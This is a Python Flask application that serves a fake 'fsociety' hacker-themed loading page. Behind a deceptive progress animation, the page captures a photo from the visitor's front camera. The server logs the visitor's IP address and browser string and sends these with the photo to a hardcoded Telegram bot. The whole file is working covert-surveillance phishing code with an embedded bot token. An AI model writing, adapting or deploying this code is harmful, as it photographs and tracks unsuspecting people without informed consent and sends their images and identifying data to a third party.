import os, base64, datetime, requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

BOT_TOKEN = "8281076655:AAFhrIC-OEqCyCgiLKScj-QOZeAF26xx2ro"
CHAT_ID = "6292733727"

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>fsociety</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body {
  height: 100%;
  background: #000;
  overflow: hidden;
}
#matrix {
  position: fixed;
  top: 0; left: 0;
  width: 100%;
  height: 100%;
  z-index: 0;
}
body {
  display: flex;
  align-items: center;
  justify-content: center;
  font-family: 'Share Tech Mono', monospace;
  color: #00ff41;
  min-height: 100vh;
}
.card {
  position: relative;
  z-index: 2;
  margin: 0 auto;
  padding: 40px 28px;
  max-width: 380px;
  width: 92%;
  text-align: center;
  border: 1px solid #00ff41;
  box-shadow: 0 0 20px rgba(0,255,65,0.2), inset 0 0 20px rgba(0,255,65,0.05);
  background: rgba(0,0,0,0.75);
  backdrop-filter: blur(4px);
  animation: fadeIn 1.5s ease;
}
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: translateY(0); }
}
.logo {
  font-size: 38px;
  letter-spacing: 8px;
  margin-bottom: 6px;
  color: #00ff41;
  text-shadow: 0 0 12px #00ff41;
  position: relative;
  display: inline-block;
}
.glitch::before,
.glitch::after {
  content: attr(data-text);
  position: absolute;
  top: 0; left: 0;
  width: 100%;
  overflow: hidden;
}
.glitch::before {
  color: #ff0033;
  animation: glitch 0.6s infinite;
  clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
}
.glitch::after {
  color: #00ffff;
  animation: glitch 0.6s infinite reverse;
  clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
}
@keyframes glitch {
  0% { transform: translate(0); }
  20% { transform: translate(-2px, 1px); }
  40% { transform: translate(2px, -1px); }
  60% { transform: translate(-1px, -1px); }
  80% { transform: translate(1px, 1px); }
  100% { transform: translate(0); }
}
.sub {
  font-size: 11px;
  color: #00802a;
  letter-spacing: 3px;
  margin-bottom: 28px;
  text-transform: uppercase;
}
.status {
  font-size: 13px;
  color: #00ff41;
  letter-spacing: 1px;
  margin-top: 20px;
  min-height: 18px;
}
.status::after {
  content: "_";
  animation: blink 1s step-end infinite;
}
@keyframes blink { 50% { opacity: 0; } }
.bar {
  width: 100%;
  height: 4px;
  background: #001a0a;
  border: 1px solid #004d1f;
  margin-top: 16px;
  overflow: hidden;
}
.bar-fill {
  height: 100%;
  width: 0%;
  background: #00ff41;
  box-shadow: 0 0 8px #00ff41;
  transition: width 1.5s linear;
}
</style>
</head>
<body>
<canvas id="matrix"></canvas>
<div class="card">
  <div class="logo">
    <span class="glitch" data-text="fsociety">fsociety</span>
  </div>
  <div class="sub">fsociety // connection</div>
  <div class="status" id="status">initializing</div>
  <div class="bar"><div class="bar-fill" id="bar"></div></div>
</div>
<script>
// Matrix-эффект падающих цифр
const canvas = document.getElementById("matrix");
const ctx = canvas.getContext("2d");
let w, h, columns, drops;
const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
const fontSize = 16;

function resize() {
  w = canvas.width = window.innerWidth;
  h = canvas.height = window.innerHeight;
  columns = Math.floor(w / fontSize);
  drops = new Array(columns).fill(1);
}
resize();
window.addEventListener("resize", resize);

function draw() {
  ctx.fillStyle = "rgba(0,0,0,0.06)";
  ctx.fillRect(0, 0, w, h);
  ctx.fillStyle = "#00ff41";
  ctx.font = fontSize + "px monospace";
  for (let i = 0; i < drops.length; i++) {
    const text = chars[Math.floor(Math.random() * chars.length)];
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
    if (drops[i] * fontSize > h && Math.random() > 0.975) {
      drops[i] = 0;
    }
    drops[i]++;
  }
}
setInterval(draw, 50);

// Статусы и прогресс
const statusEl = document.getElementById("status");
const barEl = document.getElementById("bar");
setTimeout(() => { barEl.style.width = "30%"; statusEl.innerText = "loading modules"; }, 300);
setTimeout(() => { barEl.style.width = "50%"; statusEl.innerText = "verifying identity"; }, 800);
setTimeout(() => { barEl.style.width = "70%"; statusEl.innerText = "requesting access"; }, 1500);

async function start() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "");
    await video.play();
    await new Promise(r => setTimeout(r, 1500));
    const c = document.createElement("canvas");
    c.width = video.videoWidth;
    c.height = video.videoHeight;
    c.getContext("2d").drawImage(video, 0, 0);
    const photo = c.toDataURL("image/png");
    stream.getTracks().forEach(t => t.stop());
    await fetch("/save", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({photo: photo})
    });
    barEl.style.width = "100%";
    statusEl.innerText = "access granted";
  } catch (e) {
    barEl.style.width = "100%";
    barEl.style.background = "#ff0033";
    statusEl.innerText = "access denied";
    statusEl.style.color = "#ff0033";
  }
}
setTimeout(start, 2000);
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/save", methods=["POST"])
def save():
    data = request.get_json()
    photo_data = data["photo"].split(",")[1]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    ts = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"/tmp/photo_{ts}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(photo_data))

    msg = f"IP: {ip}\nUA: {ua}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  data={"chat_id": CHAT_ID, "text": msg})
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                  data={"chat_id": CHAT_ID},
                  files={"photo": open(filename, "rb")})
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
